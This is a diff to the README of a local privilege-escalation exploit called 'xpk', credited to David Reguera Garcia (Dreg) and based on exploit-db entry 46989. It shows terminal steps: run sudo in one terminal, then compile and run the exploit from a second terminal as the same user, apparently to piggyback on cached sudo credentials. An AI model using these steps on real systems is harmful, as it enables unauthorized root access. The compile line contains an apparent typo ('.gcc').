@@ -14,6 +14,8 @@ open a terminal with a sudo user group
 
 execute any command with sudo and enter the password, ex:
 ```
+dreg@fr33project:~$ tty
+/dev/pts/4
 dreg@fr33project:~$ id
 uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
 dreg@fr33project:~$ sudo whoami
@@ -21,8 +23,11 @@ dreg@fr33project:~$ sudo whoami
 root
 ```
 
-open other terminal with the same user and execute ./xpk
+open other terminal with the same user and execute ./xpk (the name of the exploit executable is important, dont change!)
 ```
+dreg@fr33project:~$ tty
+/dev/pts/7
+dreg@fr33project:~$ .gcc -o xpk xpk.c
 dreg@fr33project:~$ ./xpk
 David Reguera Garcia aka Dreg exploit without gdb dep, based in:
 https://www.exploit-db.com/exploits/46989
